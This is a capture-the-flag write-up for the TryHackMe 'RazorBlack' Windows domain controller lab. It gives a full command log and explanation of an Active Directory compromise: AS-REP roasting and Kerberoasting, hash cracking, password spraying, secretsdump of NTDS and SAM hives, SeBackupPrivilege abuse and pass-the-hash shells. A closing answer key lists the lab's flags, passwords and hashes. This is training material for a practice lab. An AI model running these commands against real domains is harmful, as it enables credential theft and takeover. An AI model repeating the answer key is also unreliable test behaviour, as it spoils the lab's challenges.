# RazorBlack - Medium

```shell
ping -c 3 10.10.81.61
#machine responds to ping

nmap -T4 -p- -A -v 10.10.81.61

sudo vim /etc/hosts
#map ip to raz0rblack.thm

smbclient -L \\\\10.10.81.61
#no shares listed

#enumerating ldap
ldapsearch -H ldap://10.10.81.61 -x

ldapsearch -H ldap://10.10.81.61 -x -s base namingcontexts
#shows namingcontexts

ldapsearch -H ldap://10.10.81.61 -x -b "DC=raz0rblack,DC=thm"
#no output

rpcclient -U "" -N 10.10.81.61
#we can connect
#but any command gives Access Denied

enum4linux 10.10.81.61
#nothing significant

crackmapexec smb 10.10.81.61
#gives host name and domain name

#enumerate port 2049
showmount -e 10.10.81.61
#this shows that we can mount /users

sudo mkdir /mnt/users

sudo mount -t nfs 10.10.81.61:/users /mnt/users

ls -la /mnt/users

sudo cat /mnt/users/sbradley.txt
#Steven flag

echo "sbradley" > usernames.txt
#make note of the usernames enumerated

sudo cp /mnt/users/employee_status.xlsx .
#copies xlsx file to current directory

sudo chmod 777 employee_status.xlsx
#we can now view it
#this can be viewed in Windows or online platforms

vim names.txt
#list names from xlsx file

vim usernames.txt
#change names to usernames using observed pattern

GetNPUsers.py -dc-ip 10.10.81.61 raz0rblack.thm/ -usersfile usernames.txt -request
#we get hash for twilliams

hashcat -a 0 -m 18200 krbhash.txt /usr/share/wordlists/rockyou.txt
#crack the hash

smbclient -L \\\\raz0rblack.thm -U twilliams
#this shows we can access some shares
#but we do not find anything

crackmapexec smb raz0rblack.thm -u 'twilliams' -p 'roastpotatoes' --rid-brute
#to enumerate more users

vim usernames.txt
#add enumerated usernames

crackmapexec smb raz0rblack.thm -u usernames.txt -p "roastpotatoes" --continue-on-success
#check password reuse
#password change required for sbradley

smbpasswd -r raz0rblack.thm -U sbradley
#using old password as roastpotatoes
#we can give it a new password

smbmap -u sbradley -p password -H raz0rblack.thm
#we can now access another share

smbclient \\\\raz0rblack.thm\\trash -U sbradley
#mget all files

less chat_log_20210222143423.txt
#contains .zip file clue

#zip file is password-protected

zip2john experiment_gone_wrong.zip > ziphash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt
#this gives us the password
#extract zip file contents

secretsdump.py -system system.hive -ntds ntds.dit local > hashdump.txt
#dumps hashes to a file

#format the file contents
vim hashdump.txt
#remove first few lines

cut -d ":" -f 4 hashdump.txt > onlyhashes.txt
#extract only hashes for brute-force

crackmapexec smb -u lvetrova -H onlyhashes.txt --shares raz0rblack.thm
#bruteforce hashes for lvetrova
#gives the required hash

evil-winrm -u lvetrova -H f220d3988deb3f516c73f40ee16c431d -i raz0rblack.thm

cd ..

dir
#we have .xml file

type lvetrova.xml
#contains cred in form of PSCredential
#use XML serialization

$credential = Import-CliXml -Path 'C:\Users\lvetrova\lvetrova.xml'

echo $credential
#shows flag as System.Security.SecureString

$credential.GetNetworkCredential().Password
#this gives us the flag

#in attacker machine
#we can use lvetrova hash to request ticket
GetUserSPNs.py raz0rblack.thm/lvetrova -dc-ip 10.10.81.61 -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -request
#this gives us hash

hashcat -a 0 -m 13100 krbhash.txt /usr/share/wordlists/rockyou.txt
#gives password for xyan1d3

evil-winrm -u xyan1d3 -p cyanide9amine5628 -i raz0rblack.thm
#get another shell

cd ..

dir
#another .xml file

Import-CliXml -Path 'C:\Users\xyan1d3\xyan1d3.xml'

$credential.GetNetworkCredential().Password
#gives us another flag

whoami /priv
#SeBackupPrivilege enabled

#SeBackup privilege abuse

reg save hklm\sam C:\Users\xyan1d3\sam

reg save hklm\system C:\Users\xyan1d3\system
#we can now download both these dumps to our local machine

download C:\Users\xyan1d3\sam /home/sv/THM/razorblack/sam

download C:\Users\xyan1d3\system /home/sv/THM/razorblack/system

#in attacker machine
secretsdump.py -sam sam -system system LOCAL
#this gives us the Administrator hash

evil-winrm -u Administrator -H 9689931bed40ca5a2ce1218210177f0c -i raz0rblack.thm
#get shell as Administrator

cd ..

dir
#we have cookie.json and root.xml

type root.xml
#this shows a different type of data
#CyberChef shows it is hex data
#decoding from hex gives us flag

#check other users
cd C:\Users

dir
#navigate to twilliams home dir

cd twilliams

dir
#.exe file with extremely long name

type *.exe
#gives Tyson flag

#find top secret

cd C:\

dir "Program Files"
#there is a Top Secret folder

cd "C:\Program Files\Top Secret"

dir
#we have a .png here

download "C:\Program Files\Top Secret\top_secret.png" /home/sv/THM/razorblack/top_secret.png
#view this .png on attacker machine
#this gives us the top secret
```

* Open ports & services:

  * 53 - domain - Simple DNS Plus
  * 88 - kerberos-sec - Kerberos
  * 111 - rpcbind
  * 135 - msrpc - RPC
  * 139 - netbios-ssn - netbios-ssn
  * 389 - ldap - AD LDAP
  * 445 - microsoft-ds
  * 593 - ncacn_http - RPC over HTTP 1.0
  * 2049 - mountd
  * 3268 - ldap - AD LDAP
  * 3389 - ms-wbt-server - Microsoft Terminal Services
  * 5985 - http - HTTPAPI httpd 2.0
  * 9389 - mc-nmf - .NET Message Framing
  * 47001 - http - HTTPAPI httpd 2.0
  * 49664 - msrpc - RPC

* ```nmap``` gives us the domain name 'raz0rblack.thm', hostname 'RAZ0RBLACK' and CN 'HAVEN-DC'.

* We can enumerate SMB shares using ```smbclient``` and ```smbmap```, but this does not give us anything.

* We can begin enumeration of ```ldap``` with the help of ```ldapsearch```; specifying the DC names do not help in this case.

* Next, we can enumerate using ```rpcclient``` tool, but this gives us 'Access Denied' errors.

* We can run ```enum4linux``` and scan the machine, but this too does not give us anything significant.

* Running ```crackmapexec``` for SMB shows that this is a "Windows 10.0 Build 17763 x64" machine.

* We can enumerate port 2049, this has ```mountd``` running; using ```showmount```, we can see that this share can be mounted.

* After creating a directory in /mnt, we can mount the /users folder from remote share.

* This contains two files - 'employee_status.xlsx' and 'sbradley.txt'

* Here, the .txt file contains Steven's flag, and it is possible that the username for Steven is 'sbradley', so we can make a note of it.

* For the .xlsx file, we can copy it to our current directory with the permissions modified, and then it can be viewed it on Windows machine or online platforms.

* Now, this .xlsx file titled "HAVEN SECRET HACKER's CLUB" contains two columns - 'Name' and 'Role'; the 'Name' column contains names of users apparently.

* The 'Role' directory also contains some information, but we have to note the names mainly.

* Also, for the name 'Steven Bradley', we observed 'sbradley' as username - we can use the pattern similarly for all the other names to generate a list of usernames.

* Now, if we attempt 'kerberoasting' using ```GetNPUsers.py``` along with the usernames we have enumerated, we get a hash for user 'twilliams'.

* We can crack this hash using ```hashcat``` - this gives us the password 'roastpotatoes'.

* Using these credentials, we can attempt to access the shares as 'twilliam' - this works and we have access to a few shares.

* However, we cannot find anything useful, so we can use ```crackmapexec``` again to enumerate SMB, this time as 'twilliams'.

* As our user has access to 'IPC$' share, we can use the ```rid-brute``` flag in ```crackmapexec``` to enumerate users.

* We get a few more usernames, this can be added to our usernames file.

* Now, if we use ```crackmapexec``` again to check for password reuse with the enumerated usernames, we can see that user 'sbradley' shows "STATUS_PASSWORD_MUST_CHANGE".

* This means we can login as 'sbradley' and change the password using ```smbpasswd``` - by doing so, we can now access SMB shares as 'sbradley'.

* We can now access the 'trash' share; use ```mget``` to transfer all files to our machine.

* The chatlog .txt file contains a clue about the .zip file and its contents.

* The .zip file is password-protected, so we will have to use ```zip2john``` to crack the password.

* Using the cracked password, we can extract the .zip file contents, which gives us the files 'ntds.dit' and 'system.hive'.

* Using ```secretsdump.py```, we can extract hashes from these files - this gives us a lot of output; we can save this output to a file.

* We need to format the file content so that it only contains hashes.

* Then, as we need to get Ljudmila's hash, represented by username 'lvetrova', we can use ```crackmapexec``` to bruteforce using the hashes we found.

* Using this technique, we get the hash for 'lvetrova'; we can use ```evil-winrm``` to get shell as 'lvetrova'.

* Logging in, we get a .xml file, which contains credentials encrypted as PSCredential.

* We can retrieve this encrypted cred using PowerShell's built-in XML serialization; doing so, we get the flag in SecureString format, so we can decode it further.

* This way, we get the required flag.

* Now, as we have the hash for lvetrova, we can use ```GetUserSPNs.py``` to request tickets.

* This gives us another hash, this time it is for user 'xyan1d3', we can crack it using ```hashcat```.

* We now have the password for user 'xyan1d3', we can get another shell using ```evil-winrm```.

* We have another .xml file; using the technique applied previously, we get the flag for 'xyan1d3'.

* Now, we need to check for privesc.

* Using ```whoami /priv```, we can check the privileges for our user - this shows that we have 'SeBackupPrivilege' enabled.

* Googling for privilege abuse related to this privilege shows us a few techniques, we can employ any one of them to get hashes.

* By extracting the 'sam' and 'system' dumps, we can download it to our machine and use ```secretsdump.py``` again to extract hashes.

* This gives us the Administrator hash and we can use ```evil-winrm``` pass-the-hash approach to get shell as Administrator.

* We have 'root.xml' here, but unlike the previous encrypted creds, this contains a different format.

* When we copy the data and paste it in ```CyberChef```, it shows that this is Hex data; decoding from Hex gives us the root flag.

* To find Tyson's flag, we can navigate to the Users directory - we have 'twilliams' user here.

* Navigating to this folder, we have a .exe file with an extremely long name - we can print its contents and get the flag.

* Now, we need to find the top secret - we can enumerate files and folders.

* There is a folder 'Top Secret' in C:\Program Files - this contains an image file, which can be downloaded.

* Opening this image file gives us the clue for exiting Vim - we know that it is ':wq' - this is the top secret.

```markdown
1. What is the Domain Name? - raz0rblack.thm

2. What is Steven's Flag? - THM{ab53e05c9a98def00314a14ccbfa8104}

3. What is the zip file's password? - electromagnetismo

4. What is Ljudmila's Hash? - f220d3988deb3f516c73f40ee16c431d

5. What is Ljudmila's Flag? - THM{694362e877adef0d85a92e6d17551fe4}

6. What is Xyan1d3's password? - cyanide9amine5628

7. What is Xyan1d3's Flag? - THM{62ca7e0b901aa8f0b233cade0839b5bb}

8. What is the root Flag? - THM{1b4f46cc4fba46348273d18dc91da20d}

9. What is Tyson's Flag? - THM{5144f2c4107b7cab04916724e3749fb0}

10. What is the complete top secret? - :wq

11. Did you like your cookie? - Yes
```
